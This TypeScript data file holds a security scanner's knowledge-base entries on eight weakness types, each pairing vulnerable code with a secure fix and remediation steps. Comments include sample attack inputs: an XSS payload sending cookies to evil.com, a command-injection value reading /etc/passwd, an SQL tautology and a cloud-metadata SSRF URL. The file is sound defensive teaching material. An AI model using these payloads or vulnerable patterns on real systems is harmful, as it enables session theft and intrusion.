import { KnowledgeBaseItem } from '../types';

export const KNOWLEDGE_BASE_ITEMS: KnowledgeBaseItem[] = [
  {
    id: 'sqli',
    type: 'SQL Injection',
    title: 'SQL Injection (SQLi) via Dynamic Query Concatenation',
    cwe: 'CWE-89',
    category: 'SAST',
    defaultSeverity: 'critical',
    summary: 'Untrusted user input is directly concatenated or formatted into raw SQL queries without parameterized placeholders or an ORM abstraction.',
    whyItMatters: 'Allows an adversary to bypass authentication, read, modify, or delete the entire database, exfiltrate sensitive customer data, and in certain database configurations (e.g. Postgres COPY PROGRAM or MSSQL xp_cmdshell), achieve remote code execution (RCE).',
    vulnerableExample: `// ❌ VULNERABLE: Direct string interpolation into raw SQL
app.post('/api/users/search', async (req, res) => {
  const { username } = req.body;
  // Attacker input: "admin' OR '1'='1" dumps all records
  const query = \`SELECT id, username, email FROM users WHERE username = '\${username}'\`;
  const results = await db.query(query);
  res.json(results.rows);
});`,
    secureExample: `// ✅ SECURE: Use parameterized statements / prepared queries
app.post('/api/users/search', async (req, res) => {
  const { username } = req.body;
  // Database engine compiles query structure separately from user data
  const query = 'SELECT id, username, email FROM users WHERE username = $1';
  const results = await db.query(query, [username]);
  res.json(results.rows);
});`,
    remediationSteps: [
      'Always utilize parameterized queries or prepared statements for all dynamic inputs.',
      'Use trusted Object-Relational Mappings (Prisma, SQLAlchemy, Drizzle) with strict input validation.',
      'Enforce least-privilege database user permissions (e.g. read-only accounts for search endpoints).'
    ]
  },
  {
    id: 'hardcoded-secrets',
    type: 'Hardcoded Secrets',
    title: 'Hardcoded Cryptographic Keys & Cloud API Credentials',
    cwe: 'CWE-798',
    category: 'Secrets',
    defaultSeverity: 'critical',
    summary: 'Sensitive secrets such as AWS Access Keys, private RSA keys, JWT HMAC secrets, or database passwords are committed directly into source code.',
    whyItMatters: 'Committed secrets are permanently recorded in version control history. Automated public scraping bots harvest credentials in seconds, leading to catastrophic infrastructure takeover, data exfiltration, and massive unauthorized cloud bills.',
    vulnerableExample: `// ❌ VULNERABLE: Hardcoded secret keys in production source code
const AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE";
const AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
const JWT_SECRET = "supersecretcompanykey123!";

const s3 = new AWS.S3({
  accessKeyId: AWS_ACCESS_KEY_ID,
  secretAccessKey: AWS_SECRET_ACCESS_KEY
});`,
    secureExample: `// ✅ SECURE: Load secrets from environment variables or secrets manager
import { SecretsManager } from '@aws-sdk/client-secrets-manager';

// Runtime environment injection (fail fast if missing)
const jwtSecret = process.env.JWT_SECRET;
if (!jwtSecret) {
  throw new Error("FATAL: JWT_SECRET environment variable is missing.");
}

// Or use IAM Roles for Cloud Run / EC2 instances with zero static keys
const s3 = new AWS.S3();`,
    remediationSteps: [
      'Immediately rotate and revoke the exposed credentials across cloud providers.',
      'Remove credentials from git history using tools like git-filter-repo or BFG Repo-Cleaner.',
      'Store secrets in environment variables or cloud secrets managers (AWS Secrets Manager, GCP Secret Manager, Vault).'
    ]
  },
  {
    id: 'insecure-deserialization',
    type: 'Insecure Deserialization',
    title: 'Insecure Object Deserialization & Pickle Execution',
    cwe: 'CWE-502',
    category: 'SAST',
    defaultSeverity: 'critical',
    summary: 'Untrusted serialized payloads (such as Python pickle, Java ObjectInputStream, or Node node-serialize) are processed without integrity verification.',
    whyItMatters: 'Deserializing untrusted data allows attackers to manipulate application logic, tamper with authentication objects, or instantiate arbitrary objects with malicious gadget chains resulting in direct Remote Code Execution (RCE).',
    vulnerableExample: `# ❌ VULNERABLE (Python): Unpickling user-controlled base64 cookies
import base64
import pickle
from flask import request

@app.route('/api/profile')
def view_profile():
    token = request.cookies.get('session_data')
    # Malicious __reduce__ payload executes arbitrary system commands
    user_obj = pickle.loads(base64.b64decode(token))
    return f"Welcome {user_obj.username}"`,
    secureExample: `# ✅ SECURE: Use safe, standardized data formats like signed JSON / Pydantic
import json
import itsdangerous
from flask import request

signer = itsdangerous.TimestampSigner(os.environ['SECRET_KEY'])

@app.route('/api/profile')
def view_profile():
    token = request.cookies.get('session_data')
    try:
        unsigned_data = signer.unsign(token, max_age=86400)
        user_data = json.loads(unsigned_data)
        return f"Welcome {user_data['username']}"
    except itsdangerous.BadSignature:
        return "Unauthorized", 401`,
    remediationSteps: [
      'Never accept serialized objects (pickle, YAML unsafe_load, Java serialization) from untrusted sources.',
      'Use strictly typed, non-executable data serialization formats like JSON, Protocol Buffers, or MessagePack.',
      'Enforce cryptographic signatures (HMAC) on any serialized state if serialization cannot be eliminated.'
    ]
  },
  {
    id: 'xss',
    type: 'Cross-Site Scripting (XSS)',
    title: 'Stored & Reflected Cross-Site Scripting (XSS)',
    cwe: 'CWE-79',
    category: 'SAST',
    defaultSeverity: 'high',
    summary: 'Unescaped user input is injected into the DOM using methods such as dangerouslySetInnerHTML, element.innerHTML, or raw template strings.',
    whyItMatters: 'Enables malicious script execution within a victim’s browser session. Attackers can steal session tokens (cookies/localStorage), perform unauthorized state-changing actions on behalf of the user, or deface the site.',
    vulnerableExample: `// ❌ VULNERABLE: Direct injection into innerHTML without sanitization
function renderUserBio(bioText: string) {
  const container = document.getElementById('user-bio-container');
  // Attacker input: "<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>"
  container.innerHTML = \`<div class="bio">\${bioText}</div>\`;
}`,
    secureExample: `// ✅ SECURE: Use safe DOM textContent or DOMPurify HTML sanitization
import DOMPurify from 'dompurify';

function renderUserBio(bioText: string) {
  const container = document.getElementById('user-bio-container');
  // Option A: Safe textContent assignment (automatic escaping)
  container.textContent = bioText;

  // Option B: If rich HTML is intentionally supported, sanitize strictly
  // container.innerHTML = DOMPurify.sanitize(bioText);
}`,
    remediationSteps: [
      'Rely on automatic context-aware escaping provided by modern frameworks (React JSX, Vue).',
      'If raw HTML must be inserted, sanitize it with a battle-tested library like DOMPurify.',
      'Deploy a strict Content Security Policy (CSP) header prohibiting inline script execution.'
    ]
  },
  {
    id: 'weak-crypto',
    type: 'Weak Cryptography',
    title: 'Deprecated Hashing & Insecure Cipher Algorithms',
    cwe: 'CWE-327',
    category: 'SAST',
    defaultSeverity: 'medium',
    summary: 'Usage of obsolete, collision-prone cryptographic algorithms (e.g. MD5, SHA-1, DES) for password storage or data integrity checks.',
    whyItMatters: 'Collision attacks allow attackers to forge valid signatures or generate identical hashes. Furthermore, fast algorithms like MD5/SHA1 are vulnerable to GPU rainbow-table attacks for password recovery.',
    vulnerableExample: `// ❌ VULNERABLE: Using fast MD5 for password storage
import crypto from 'crypto';

function hashPassword(password: string): string {
  // MD5 can be cracked at billions of hashes per second
  return crypto.createHash('md5').update(password).digest('hex');
}`,
    secureExample: `// ✅ SECURE: Use salted, memory-hard key derivation (Argon2 or bcrypt)
import argon2 from 'argon2';

async function hashPassword(password: string): Promise<string> {
  // Argon2id is resistant to GPU attacks and provides built-in salting
  return await argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 2 ** 16,
    timeCost: 3
  });
}`,
    remediationSteps: [
      'Use Argon2id, bcrypt, or PBKDF2 with high work factors for password hashing.',
      'For cryptographic integrity and signatures, migrate from SHA-1/MD5 to SHA-256, SHA-384, or SHA-3.',
      'For symmetric encryption, use AES-256-GCM or ChaCha20-Poly1305 with authenticated encryption.'
    ]
  },
  {
    id: 'vulnerable-dependencies',
    type: 'Vulnerable Dependencies',
    title: 'Known CVEs in Third-Party Package Ecosystems',
    cwe: 'CWE-1395',
    category: 'Dependencies',
    defaultSeverity: 'high',
    summary: 'Application depends on outdated or vulnerable npm/PyPI packages with documented public CVE vulnerabilities.',
    whyItMatters: 'Supply chain vulnerabilities allow automated bots to exploit well-documented public exploits in popular libraries (e.g., prototype pollution in lodash, prototype-pollution in minimist, log4j).',
    vulnerableExample: `// ❌ VULNERABLE package.json dependency:
{
  "dependencies": {
    "lodash": "4.17.15", // Known Prototype Pollution CVE-2020-8203 & CVE-2021-23337
    "jsonwebtoken": "8.5.1" // Key confusion & algorithmic bypass vulnerabilities
  }
}`,
    secureExample: `// ✅ SECURE: Updated dependencies with locked patch versions
{
  "dependencies": {
    "lodash": "4.17.21", // Patched against prototype pollution
    "jsonwebtoken": "9.0.2"
  }
}
// Run automated audits in CI/CD pipeline:
// npm audit --audit-level=high`,
    remediationSteps: [
      'Upgrade vulnerable packages to the latest patched versions.',
      'Run automated dependency scans (npm audit, pip-audit, Snyk, Dependabot) on every pull request.',
      'Enforce lockfile integrity checking and pinned semantic versioning.'
    ]
  },
  {
    id: 'command-injection',
    type: 'Command Injection',
    title: 'OS Command Injection via Shell Execution',
    cwe: 'CWE-78',
    category: 'SAST',
    defaultSeverity: 'critical',
    summary: 'Direct execution of system shell commands (e.g. child_process.exec, os.system) with unvalidated user input strings.',
    whyItMatters: 'An attacker can append shell operators like `;`, `&&`, or `|` to execute arbitrary bash/cmd commands on the host operating system with the permissions of the application server.',
    vulnerableExample: `// ❌ VULNERABLE: exec() invokes a system shell allowing command chaining
import { exec } from 'child_process';

app.get('/api/ping', (req, res) => {
  const host = req.query.host; // Input: "8.8.8.8; cat /etc/passwd"
  exec(\`ping -c 1 \${host}\`, (err, stdout) => {
    res.send(stdout);
  });
});`,
    secureExample: `// ✅ SECURE: Use execFile without shell interpretation + strict input regex
import { execFile } from 'child_process';
import validator from 'validator';

app.get('/api/ping', (req, res) => {
  const host = req.query.host as string;
  // Strict IP address validation
  if (!validator.isIP(host)) {
    return res.status(400).send('Invalid IP address');
  }
  // execFile does not invoke /bin/sh, passing arguments safely as an array
  execFile('ping', ['-c', '1', host], (err, stdout) => {
    res.send(stdout);
  });
});`,
    remediationSteps: [
      'Avoid calling external OS shells whenever a native language API or library exists.',
      'If execution is mandatory, use execFile() or spawn() without { shell: true } and pass arguments as separate array elements.',
      'Enforce strict input whitelisting (e.g. validating alphanumeric or IP regex).'
    ]
  },
  {
    id: 'ssrf',
    type: 'Server-Side Request Forgery',
    title: 'Server-Side Request Forgery (SSRF) in Remote Ingestion',
    cwe: 'CWE-918',
    category: 'SAST',
    defaultSeverity: 'high',
    summary: 'The application fetches remote resources based on user-supplied URLs without restricting requests to private/internal networks.',
    whyItMatters: 'Attackers can force the server to scan internal network infrastructure, access localhost services (Redis, database ports), or query cloud metadata endpoints (e.g. http://169.254.169.254) to steal IAM role credentials.',
    vulnerableExample: `// ❌ VULNERABLE: Direct axios fetch from unvalidated repoUrl
app.post('/api/scans/git', async (req, res) => {
  const { repoUrl } = req.body;
  // Attacker input: "http://169.254.169.254/computeMetadata/v1/"
  const response = await axios.get(repoUrl);
  res.json({ data: response.data });
});`,
    secureExample: `// ✅ SECURE: Validate URL protocol, resolve IP, and block private CIDR ranges
import ipaddr from 'ipaddr.js';
import dns from 'dns/promises';

async function validateSafeExternalUrl(rawUrl: string): Promise<boolean> {
  const parsed = new URL(rawUrl);
  if (!['http:', 'https:'].includes(parsed.protocol)) return false;

  // Resolve hostname to IP address
  const addresses = await dns.lookup(parsed.hostname);
  const addr = ipaddr.parse(addresses.address);

  // Reject loopback, private RFC1918, link-local metadata addresses
  if (addr.range() !== 'unicast') {
    throw new Error('SSRF Protection: Access to private network addresses is forbidden.');
  }
  return true;
}`,
    remediationSteps: [
      'Resolve the hostname and verify that the target IP does not fall into loopback (127.0.0.0/8), private RFC1918 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), or cloud metadata (169.254.169.254).',
      'Only permit HTTPS/HTTP schemes; disallow file://, gopher://, dict://.',
      'Deploy the scanner worker inside an isolated network sandbox without cloud metadata access.'
    ]
  }
];
